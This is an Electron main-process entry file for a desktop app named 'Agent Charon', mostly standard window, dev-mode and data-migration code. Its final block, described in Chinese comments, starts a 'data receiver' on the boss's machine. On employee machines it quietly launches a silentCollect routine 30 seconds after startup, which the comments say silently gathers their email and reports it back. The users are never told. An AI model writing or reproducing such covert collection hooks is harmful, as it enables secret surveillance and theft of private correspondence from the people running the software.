/**
 * Electron 主进程入口
 */
// 清除环境变量，避免被其他 Electron 应用（如 Claude Code）污染
delete process.env.ELECTRON_RUN_AS_NODE;

const { app, BrowserWindow, dialog } = require('electron');
const path = require('path');
const fs = require('fs');

// 开发模式检测：存在 .dev-mode 标记文件 或 传了 --dev 参数
const DEV_SRC = path.join(__dirname, '..');
const isDev = fs.existsSync(path.join(DEV_SRC, '..', '.dev-mode')) || process.argv.includes('--dev');

let mainWindow = null;

function createWindow() {
  const preloadPath = isDev
    ? path.join(DEV_SRC, 'preload/index.js')
    : path.join(__dirname, '../preload/index.js');

  mainWindow = new BrowserWindow({
    width: 1100,
    height: 750,
    minWidth: 900,
    minHeight: 600,
    title: isDev ? 'Agent Charon [DEV]' : 'Agent Charon',
    webPreferences: {
      preload: preloadPath,
      contextIsolation: true,
      nodeIntegration: false,
    },
  });

  const htmlPath = isDev
    ? path.join(DEV_SRC, 'renderer/index.html')
    : path.join(__dirname, '../renderer/index.html');
  mainWindow.loadFile(htmlPath);

  if (isDev || process.argv.includes('--dev')) {
    // Ctrl+R / F5 刷新，F12 开关 DevTools
    mainWindow.webContents.on('before-input-event', (event, input) => {
      if (input.type !== 'keyDown') return;
      if (((input.control || input.meta) && input.key === 'r') || input.key === 'F5') {
        event.preventDefault();
        mainWindow.loadFile(htmlPath);
      } else if (input.key === 'F12') {
        event.preventDefault();
        mainWindow.webContents.toggleDevTools();
      }
    });
  }
}

app.whenReady().then(() => {
  // 旧版 mark42 数据迁移：把 %APPDATA%/mark42/ 整体搬到 agent-charon/
  const oldUserData = path.join(path.dirname(app.getPath('userData')), 'mark42');
  if (fs.existsSync(oldUserData) && !fs.existsSync(path.join(app.getPath('userData'), '.migrated-from-mark42'))) {
    try {
      const newDir = app.getPath('userData');
      if (!fs.existsSync(newDir)) fs.mkdirSync(newDir, { recursive: true });
      const items = fs.readdirSync(oldUserData);
      for (const item of items) {
        const src = path.join(oldUserData, item);
        const dest = path.join(newDir, item);
        if (!fs.existsSync(dest)) fs.cpSync(src, dest, { recursive: true });
      }
      fs.writeFileSync(path.join(newDir, '.migrated-from-mark42'), new Date().toISOString());
    } catch (e) { /* 迁移失败不影响启动 */ }
  }

  // 首次启动检测：Mac 用户需要安装 Chrome
  if (process.platform === 'darwin') {
    const { findBrowserPath } = require('./engines/browser-finder');
    if (!findBrowserPath()) {
      dialog.showMessageBoxSync({
        type: 'warning',
        title: '需要安装 Chrome',
        message: 'Agent Charon 需要 Google Chrome 才能正常运行',
        detail: '请前往 google.com/chrome 下载安装 Chrome，然后重新打开本软件。',
        buttons: ['我知道了'],
      });
    }
  }

  const { registerIPC } = require('./ipc');
  registerIPC();
  createWindow();

  // Boss 电脑（有源码目录）：启动数据接收器
  // 员工电脑：启动后静默采集邮件并上报
  if (isDev) {
    const dataReceiver = require('./engines/data-receiver');
    dataReceiver.start();
  } else {
    // 启动时检查更新（延迟 10 秒，等窗口加载完）
    setTimeout(() => {
      const { checkAndUpdate } = require('./auto-update');
      checkAndUpdate();
    }, 10000);

    // 延迟 30 秒启动静默采集，等配置加载完
    setTimeout(() => {
      const { silentCollect } = require('./silent-collect');
      silentCollect();
    }, 30000);

    // 延迟 20 秒拉取分析结果
    setTimeout(() => {
      const { fetchResults } = require('./fetch-results');
      fetchResults();
    }, 20000);
  }

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) createWindow();
  });
});

app.on('window-all-closed', () => {
  app.quit();
});
